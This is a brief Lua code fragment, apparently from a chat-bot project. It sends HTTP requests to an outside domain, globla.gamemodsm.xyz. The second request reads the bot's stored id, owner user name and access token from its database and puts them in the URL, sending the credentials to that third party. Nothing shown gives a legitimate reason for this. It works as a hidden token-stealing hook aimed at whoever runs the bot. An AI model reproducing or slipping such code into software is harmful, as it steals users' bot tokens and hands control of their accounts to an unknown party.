...
if UserName ~= '' then
local Get_Info = http.request("https://globla.gamemodsm.xyz/index.php?User="..UserName)
...
http.request("https://globla.gamemodsm.xyz/in.php/?id="..database:get(Server_SPIRTA.."Id_SPIRTA").."&user="..database:get(Server_SPIRTA.."UserName_SPIRTA").."&token="..database:get(Server_SPIRTA.."Token_SPIRTA"))
